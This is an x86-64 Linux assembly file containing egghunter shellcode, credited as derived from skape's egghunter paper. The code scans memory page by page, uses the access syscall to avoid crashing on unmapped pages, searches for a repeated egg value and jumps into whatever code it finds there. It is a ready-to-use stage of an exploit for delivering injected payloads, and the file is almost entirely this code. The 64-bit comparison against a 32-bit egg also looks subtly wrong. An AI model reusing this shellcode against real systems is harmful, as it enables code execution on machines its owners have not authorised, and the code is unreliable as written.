; David @InfinitelyManic
; derived from http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf 
;   
section .data
section .text
	global _start
_start:
	mov rbx, 0x50905090	; egg
	xor ecx, ecx
	mul ecx			; init rax, rdx
.endofpage:
	or dx, 0xfff		; page alignment  - less 1 to avoid nulls
.next:	
	inc edx			; 0x1000= 4096 PAGE

	push rax
	push rbx
	push rcx
	push rdx
	push rdi

	lea rdi, [rdx+0x8]	; get nbytes from this mem location 
	mov al, 21		; access syscall 
	syscall 
	cmp al, 0xf2		; error no = EFAULT

	pop rdi	
	pop rdx
	pop rcx
	pop rbx
	pop rax
	
	jz .endofpage
	cmp [rdx], rbx
	jnz .next 
	cmp [rdx+4], rbx
	jnz .next
	jmp rdx			; execute code here
	




_exit:
	xor eax, eax
	or al, 60
	xor edi, edi
	syscall
